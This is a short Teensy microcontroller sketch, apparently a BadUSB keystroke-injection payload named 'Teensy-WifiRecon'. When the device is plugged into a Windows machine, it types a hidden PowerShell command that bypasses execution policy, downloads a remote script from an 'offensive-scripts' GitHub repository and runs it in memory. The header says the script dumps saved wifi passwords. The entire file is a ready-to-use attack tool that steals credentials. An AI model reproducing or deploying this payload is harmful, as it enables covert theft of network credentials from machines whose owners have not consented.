/*
 * Teensy-WifiRecon
 * Waits 2 seconds upon plugging teensy device in, then loads powershell script into memory to dump wifi passwords. Inspired by Hak5's 3 second shell concept.
 * powershell script loaded: https://github.com/timebotdon/offensive-scripts/Windows/wifirecon.ps1
*/

int ds = 1000;
int LED_PIN = 13;

void setup() {
  pinMode(LED_PIN, OUTPUT);
  delay(2000);
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("powershell -exec bypass -windowstyle hidden -c IEX(New-object Net.Webclient).Downloadstring('https://raw.githubusercontent.com/timebotdon/offensive-scripts/master/Windows/wifirecon.ps1')");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void loop() {
  // Blink when payload runtime is complete
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}
